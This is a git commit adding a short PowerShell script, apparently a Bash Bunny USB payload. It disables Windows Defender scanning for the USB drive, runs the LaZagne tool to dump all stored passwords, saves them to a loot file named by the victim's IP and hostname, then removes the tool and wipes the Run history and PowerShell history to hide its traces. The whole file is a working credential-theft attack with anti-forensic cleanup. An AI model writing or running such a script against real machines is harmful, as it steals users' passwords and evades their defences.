4d799f3853d44fdbb2c744f0ba9191432a0ae955
kuyaya <alois.kuyaya@gmx.ch>
2020-01-24 14:40:58 +0100

    Add files via upload

---
+++ lazassword.ps1
@@ -0,0 +1,12 @@
+$BLABEL = (gwmi -class win32_volume -f {label = "BASHBUNNY"}).DriveLetter
+Add-MpPreference -ExclusionPath "$BLABEL"
+Expand-Archive -Force $BLABEL\lazagne.zip $BLABEL\lazagne
+$LPATH = & $BLABEL\lazagne\lazagne.exe all -vv
+$ipV4 = Test-Connection -ComputerName (hostname) -Count 1  | Select IPV4Address
+$tar_hostname = hostname
+$LOOTFILE = "$BLABEL\loot\$ipV4$tar_hostname.txt"
+$LPATH | Out-File -FilePath $LOOTFILE
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item "$BLABEL\lazagne\" -recurse
+Remove-MpPreference -ExclusionPath "$BLABEL"
+Clear-History
